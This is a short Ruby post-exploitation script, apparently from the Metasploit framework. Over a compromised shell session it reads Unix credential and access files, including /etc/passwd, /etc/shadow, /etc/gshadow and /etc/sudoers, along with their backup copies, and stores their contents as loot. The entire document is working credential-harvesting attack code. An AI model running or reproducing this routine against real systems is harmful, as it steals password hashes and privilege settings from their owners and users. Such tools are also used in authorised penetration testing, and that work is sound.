##
# $Id$
##

print_status("Collecting the password file.")

target_files = [
	{:cmd => "cat /etc/passwd", :ltype => "host.unix.passwd", :ctype => "text/plain", :name => "passwd", :info => "/etc/passwd"},
	{:cmd => "cat /etc/shadow", :ltype => "host.unix.shadow", :ctype => "text/plain", :name => "shadow", :info => "/etc/shadow"},
	{:cmd => "cat /etc/master.passwd", :ltype => "host.unix.passwd", :ctype => "text/plain", :name => "master.passwd", :info => "/etc/master.passwd"},
	{:cmd => "cat /etc/security/passwd", :ltype => "host.unix.passwd", :ctype => "text/plain", :name => "security.passwd", :info => "/etc/security/passwd"},
	{:cmd => "cat /.secure/etc/passwd", :ltype => "host.unix.passwd", :ctype => "text/plain", :name => "passwd", :info => "/.secure/etc/passwd"},
	{:cmd => "cat /etc/security/passwd.adjunct", :ltype => "host.unix.passwd", :ctype => "text/plain", :name => "passwd.adjunct", :info => "/etc/security/passwd.adjunct"},
	{:cmd => "cat /etc/group", :ltype => "host.unix.group", :ctype => "text/plain", :name => "group", :info => "/etc/group"},
	{:cmd => "cat /etc/gshadow", :ltype => "host.unix.gshadow", :ctype => "text/plain", :name => "gshadow", :info => "/etc/gshadow"},
	{:cmd => "cat /etc/sudoers", :ltype => "host.unix.sudoers", :ctype => "text/plain", :name => "sudoers", :info => "/etc/sudoers"},
	{:cmd => "cat /etc/passwd-", :ltype => "host.unix.passwd.backup", :ctype => "text/plain", :name => "passwd-", :info => "/etc/passwd-"},
	{:cmd => "cat /etc/shadow-", :ltype => "host.unix.shadow.backup", :ctype => "text/plain", :name => "shadow-", :info => "/etc/shadow-"},
	{:cmd => "cat /etc/group-", :ltype => "host.unix.group.backup", :ctype => "text/plain", :name => "group-", :info => "/etc/group-"},
	{:cmd => "cat /etc/gshadow-", :ltype => "host.unix.gshadow.backup", :ctype => "text/plain", :name => "gshadow-", :info => "/etc/gshadow-"},
]

target_files.each do |ent|
	data = client.shell_command_token_unix("#{ent[:cmd]} 2>/dev/null")
	if data and data.strip.length > 0
		pro.store_loot(ent[:ltype], ent[:ctype], client, data.strip, ent[:name], ent[:info])
	end
end

